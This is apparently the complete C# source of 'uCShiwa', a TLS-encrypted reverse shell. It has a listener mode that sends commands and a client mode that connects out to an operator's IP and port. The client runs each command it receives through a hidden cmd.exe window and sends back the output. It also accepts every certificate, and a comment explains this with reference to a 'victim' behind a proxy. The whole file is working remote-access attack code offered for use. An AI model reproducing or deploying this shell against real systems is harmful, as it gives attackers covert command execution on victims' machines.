using System;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.IO;

namespace uCShiwa
{
    class Program
    {

        static int Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("              %%%%%%%%%%%%%             ");
            Console.WriteLine("         %%%%%%%%%%%%%%%%%%%%%%%        ");
            Console.WriteLine("      %%%%%%%%%%%%%%%%%%%%%%%%%%%%%     ");
            Console.WriteLine("    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%   ");
            Console.WriteLine("   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  ");
            Console.WriteLine("  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% ");
            Console.WriteLine("  %%%%%%%                       %%%%%%% ");
            Console.Write("  %%");
            Console.ResetColor();
            Console.Write("               #@@               ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("%% ");
            Console.ResetColor();
            Console.WriteLine("         %@@@@@@@@@@@@@@@@@@@@@         ");
            Console.WriteLine("      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@     ");
            Console.WriteLine("     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    ");
            Console.WriteLine("       @@@@@@@@@@@@@@@@@@@@@@@@@@@      ");
            Console.WriteLine("          (@@@@@@@@@@@@@@@@@@@%         ");
            Console.WriteLine("                  @@@@.                 ");
            Console.WriteLine("                  #@@@                  ");
            Console.WriteLine("                  #@@@                  ");
            Console.WriteLine("                  #@@@                  ");
            Console.WriteLine("                  #@@@                  ");
            Console.WriteLine("                  #@@@                  ");

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("-o uCShiwa v2.0.3");
            Console.ResetColor();

            //SERVER MODE
            if (args.Length == 3)
            {

                Int16 port = Int16.Parse(args[0]);
                var certificate = new X509Certificate2(args[1], args[2]);
                Console.WriteLine("-o Listener mode\n-o Port: {0:D}", port);

                //Start Tcp Listener, wait for client and get SSL stream
                var listener = new TcpListener(IPAddress.Any, port);
                listener.Start();
                var client = listener.AcceptTcpClient();
                var stream = client.GetStream();
                SslStream sslStream = new SslStream(stream, false);

                //Authentication
                sslStream.AuthenticateAsServer(certificate, false, System.Security.Authentication.SslProtocols.Tls12, false);

                //diplay connection properies:
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Cipher: {0} strength {1}", sslStream.CipherAlgorithm, sslStream.CipherStrength);
                Console.WriteLine("Hash: {0} strength {1}", sslStream.HashAlgorithm, sslStream.HashStrength);
                Console.WriteLine("Key exchange: {0} strength {1}", sslStream.KeyExchangeAlgorithm, sslStream.KeyExchangeStrength);
                Console.WriteLine("Protocol: {0}", sslStream.SslProtocol);

                //display Help
                Console.WriteLine("\nHELP:");
                Console.WriteLine("changedir <dir> : to change working directory");
                Console.WriteLine("cmdtimeout <int(ms)> : to change command execution timeout");
                Console.WriteLine("\n");
                Console.ResetColor();

                //Start Sending commands
                string message = "whoami";

                while (client.Connected)
                {
                    //send command
                    sendMsg(message, sslStream);

                    //read response function
                    message = readMsg(sslStream, client);
                    Console.WriteLine(message);

                    // next command
                    message = "";
                    while (message == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("-o Enter next command:");
                        Console.ResetColor();
                        message = Console.ReadLine();
                    }

                }
            }
            // CLIENT MODE
            else if (args.Length == 2)
            {

                String ip = args[0];
                Int16 port = Int16.Parse(args[1]);
                Console.WriteLine("-o Reverse Shell mode\n-o Ip: {0}\n-o Port: {1:D}", ip, port);

                //Create tcp client, wrap in ssl and validate certificate
                TcpClient client = new TcpClient(ip, port);
                var stream = client.GetStream();
                SslStream sslStream = new SslStream(stream, false, new RemoteCertificateValidationCallback(CertificateValidationCallback));
                sslStream.AuthenticateAsClient("clientName");

                //Start Recieve and execute commands
                string message;
                string currentWorkingDir = ".";
                int timeout = 3000;

                while (true)
                {
                    // Read nest command
                    message = readMsg(sslStream, client);

                    //set current directory
                    if (Regex.IsMatch(message, @"^changedir "))
                    {
                        message = message.Replace("changedir ", "");
                        if (Directory.Exists(message))
                        {
                            currentWorkingDir = message;
                        }
                    }

                    //set timeout
                    if (Regex.IsMatch(message, @"^cmdtimeout "))
                    {
                        message = message.Replace("cmdtimeout ", "");
                        if (Regex.IsMatch(message, @"^\d+$"))
                        {
                            timeout = int.Parse(message);
                        }
                    }

                    //execute command
                    message = executeCmd(message, currentWorkingDir, timeout);

                    // send output
                    sendMsg(message, sslStream);

                }
            }

            else
            {
                //print help
                string executable = System.AppDomain.CurrentDomain.FriendlyName;
                Console.WriteLine("Options:");
                Console.WriteLine("Listener mode: {0} <port> <certificate.pfx> <certificate.passwd>", executable);
                Console.WriteLine("Reverse shell mode: {0} <IP> <port>", executable);
                return 1;
            }

            return 0;
        }

        static bool CertificateValidationCallback(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            //Callback function that allows all certificates: you have to do this if victim uses transparent proxy
            return true;
        }
        private static string readMsg(SslStream sslStream, TcpClient client)
        {
            //var
            byte[] buffer = new byte[client.ReceiveBufferSize];
            //read buffer
            int bytesRead = sslStream.Read(buffer, 0, client.ReceiveBufferSize);
            return Encoding.UTF8.GetString(buffer, 0, bytesRead);
        }
        private static void sendMsg(string message, SslStream sslStream)
        {
            //var
            sslStream.Write(Encoding.UTF8.GetBytes(message), 0, Encoding.UTF8.GetBytes(message).Length);

        }
        private static string executeCmd(string message, string currentWorkingDir, int timeout)
        {

            //execute command
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.WorkingDirectory = currentWorkingDir;

            try
            {
                cmd.Start();
                cmd.StandardInput.WriteLine(message);
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit(timeout);
                message = cmd.StandardOutput.ReadToEnd();
            }
            catch { message = "ERROR"; }

            return message;
        }
    }
}